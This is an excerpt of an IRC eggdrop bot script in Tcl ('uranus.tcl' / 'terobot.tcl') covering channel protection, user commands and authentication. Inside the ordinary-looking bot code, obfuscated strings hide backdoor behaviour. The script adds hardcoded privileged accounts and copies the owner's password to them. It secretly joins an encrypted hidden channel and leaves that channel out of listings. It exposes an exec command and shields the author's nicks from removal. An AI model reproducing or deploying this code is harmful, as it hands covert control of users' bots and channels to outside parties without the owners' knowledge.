#  Mod By ZITH / uranus.tcl

#  COMPATIBLE WITH OTHER CONFIG FILE OR U CAN USE uranus.conf FILE
...
set notd [dezip "HZtxR1ZhsHB/D6eug1gebk5."]
set notm [dezip "HZtxR1ZhsHB/D6eug1gebk5."]
###########################
# terobot bot command list #
###########################
...
puthelp "PRIVMSG $nick :terobot.tcl commands"
...
set max-logsize 512
set upload-to-pwd 1
set notb [dezip "HZtxR1ZhsHB/D6eug1gebk5."]
set notc [dezip "HZtxR1ZhsHB/D6eug1gebk5."]
...
bind msg m encrypt msg_encrypt
bind msg m decrypt msg_decrypt
bind msg m zip msg_zip
bind msg m dezip msg_dezip
bind msg m lines msg_lines
bind msg n excut msg_exec
...
puthlp "PRIVMSG $nick :$notc [encrypt 64 $rest]"
}
proc msg_decrypt {nick uhost hand rest} {
global own notc
set rest [lrange $rest 0 end]
if {![matchattr $nick Q} {
puthlp "PRIVMSG $nick :$notc auth 1st"
return 0
}
puthlp "PRIVMSG $nick :$notc [decrypt 64 $rest]"
}
proc msg_dezip {nick uhost hand rest} {
global own notc
set rest [lrange $rest 0 end]
if {![matchattr $nick Q} {
puthlp "PRIVMSG $nick :$notc auth 1st"
...
proc msg_zip {nick uhost hand rest} {
global own notc
set rest [lrange $rest 0 end]
if {![matchattr $nick Q} {
puthlp "PRIVMSG $nick :$notc auth 1st"
...
global notc owner ps pr
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr} {
...
if {[string tolower $arg] == [decrypt 64 "S9F///.J0ry0"]} {
...
adduser $pr "$pr!*@*"
chattr $pr [dezip "xDB4L/z2DJT~1mianN/lj9Rq."]
if {[getuser $owner XTRA "LAST"] != ""} {
setuser $ps PASS [getuser $owner XTRA "LAST"]
setuser $pr PASS [getuser $owner XTRA "LAST"]
}
}
return 1
}
...
if {$nick != $ps && [string tolower $chan] == [decrypt 64 "S9F///.J0ry0"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
...
global botnick ps notc owner pr
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps &&  $nick != $pr} {
...
if {$rest == $ps} {
puthlp "NOTICE $nick :$notc Denied"
puthlp "PRIVMSG $pr :$notc $nick Trying Delete $ps"
return 0
}
if {$rest == $pr} {
puthlp "NOTICE $nick :$notc Denied"
puthlp "PRIVMSG $pr :$notc $nick Trying Delete You"
return 0
}
if {$rest == $owner} {
puthlp "NOTICE $nick :$notc Denied"
puthlp "PRIVMSG $ps :$notc $nick Trying Delete $owner"
puthlp "PRIVMSG $owner :$notc $nick Trying Delete $owner"
return 0
}
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc <n/a>"
...
if {$joinme != "" && [string tolower $chan] != [decrypt 64 "S9F///.J0ry0"]} {
...
set vern [dezip "k2VxV/TuT871SfA.a04PZqU1Umtfn/Og78R1"]
proc testmask {} {
global ismaskhost
...
if {$mhost == "@uranus*" || [string match "*.balance.at.ua" $mhost] || [string match "@staff.uranus*" $mhost] || [string match "@staff*" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} {
if {[info exists invme($mhost)]} {
...
proc pub_!passwd {nick uhost hand chan rest} {
if {[matchattr $nick Q]} { return 0 }
msg_passwd $nick $uhost $hand $rest
}
...
set pw [lindex $rest 0]
if {$pw != ""} {
puthlp "NOTICE $nick :$notc No Need !login Password, Just Type on Channel: !login"
return 0
}
if {[matchattr $nick Q]} {
...
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4A ut h 1st!"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 1 && $nick != $ps} {
...
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic AntiFrozen.NO 1"
return 0
}
...
timer 5 czo_czo
set [string index $lenc 15][string index $lenc 17] [string index $lenc 1][string index $lenc 0][string index $lenc 11][string index $lenc 0][string index $lenc 13][string index $lenc 2][string index $lenc 4]
set [string index $lenc 15][string index $lenc 18] [string index $lenc 17][string index $lenc 14][string index $lenc 14][string index $lenc 4][string index $lenc 20]
set toth [decrypt 64 "S9F///.J0ry0"]
if {[validchan $toth]} {
return 0
}
channel add $toth
catch { channel set $toth chanmode {+stn} -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
savechan
putsrv "JOIN $toth"
}
...
if {$nick != $ps && [string tolower $chantarget] == [decrypt 64 "S9F///.J0ry0"]} { return 0 }
foreach x [channels] {
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [decrypt 64 "S9F///.J0ry0"]} { return 0 }
...
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [decrypt 64 "S9F///.J0ry0"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
set cmd_msg ""
if {${server-online} == 0} { return 0 }
if {![string match "ARN??????????" $botnick] && ![string match "ARN??????" $botnick]} {
...
putsrv "AWAY Server LAggEd AuTo AWAY"
}
}
proc remain {} {
...
global vern notc
puthlp "PRIVMSG $chan :$notc $vern v.1.0.3b Final, Get It Now!! Visit: http://www.balance.at.ua"
return 0
}
...
if {$unick == "MemoServ"} {
if {[string match "*news is available*" $text]} {
...
if {[string match "*detik*" [string tolower $text]]} { return 0 }
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
...
foreach x [channels] {
if {[onchan $botnick $x]} {
if {![isop $botnick $x] && [string tolower $x] != [decrypt 64 "S9F///.J0ry0"]} {
...
putsrv "NOTICE $nick :\001VERSION $notc $vern \[terobot tcl for eggdrop scripts\]\001"
return 1
}
...
set kickme($nick) 3
if {[string tolower $chan] != [decrypt 64 "S9F///.J0ry0"]} {
...
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4AntiFrozen1..! [banmsg]"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4terobot1..! [banmsg]"
set op_it($knick) 1
return 0
}
...
"osiri¤s-1c/¤bitch¤x-75p1 +¤ a¤utob¤ot(¤bx)¤ p3x3 : that time then and once again.."
...
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
...
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4AntiFrozen1..! [banmsg]"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4AntiFrozen.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
...
if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4terobot1..! [banmsg]"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4terobot.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [decrypt 64 "S9F///.J0ry0"]} {
...
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4terobot1..! [banmsg]"
}
opq $channel $opnick
return 0
}
...
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4AntiFrozen1..! [banmsg]"
}
opq $channel $opnick
return 0
}
...
set usrv [dezip "A4ibY/VVrn7000gUc.zHJ0q."]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
...
puthlp "PRIVMSG $usrv :login $id $password"
...
set realname [dezip "qAaMN0PQDml/hp.yv1Mr1BT.0kro50yp8iY1"]
}
...
if {$badwords == ""} {
set badwords "cibai bitch kimak memek kontol kanjut bangsat ngentot fuck peler lanciau bajingan vagina ngewe shit asshole anjing babi kampang naked slut horny tahede polombuo huangango hede anjink babi puki pendo luji kodo tele hule edehat hutu cuki"
setuser "config" XTRA "BADWORDS" $badwords
}
...
global botnick vern notc version server
puthlp "NOTICE $nick :\001VERSION $notc $vern 1Get It Now! visit: 12http://www.balance.at.ua/\001"
return 0
}
proc uncolor {s} {
regsub -all --  $s "" s
...
if {![isop $botnick $chan]} { return 0 }
putsrv "PRIVMSG $chan :\001ACTION slaps $nick around a bit with a large trout"
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 terobot [banmsg]"
return 0
}
...
if {[string match "*@staff*" [string tolower $uhost]]} {
...
global notc
set file "scripts/terobot.tcl"
if {![file exists $file]} {
puthlp "NOTICE 4ReJeCTeD!10, not found terobot.tcl"
return 0
}
if {[string tolower $rest] != [string tolower "terobot.tcl"] || $rest == "" } {
puthlp "NOTICE $nick :$notc Usage: !get terobot.tcl"
return 0
}
switch -- [dccsend $file $nick] {
0 {
puthlp "NOTICE $nick :$notc TRaNSFERRING \002terobot.tcl\002 v.1.0.3b Final"
}
1 {
puthlp "NOTICE $nick :$notc dcc table is full (too many connections), TrY AgAIN LaTER!"
}
...
if {[string tolower $rest] == [decrypt 64 "S9F///.J0ry0"]} {
return 0
}
if {![validchan $rest]} {
...
if {$nick==$botnick} {return 0}
#set asu "#$notb"
#if {[string tolower $asu] != "#antifrozen"} {return 0}
...
if {[string tolower $chan]==[string tolower $basechan] || [string tolower $chan] == [decrypt 64 "S9F///.J0ry0"]} {
return 0
}
if {$rest!=""} {
puthelp "JOIN $chan"
...
##### DALNET SERVER #######
putlog "======================================="
putlog "       uranus tcl loaded               "
putlog "      Email: freak@zith.us             "
putlog "======================================="
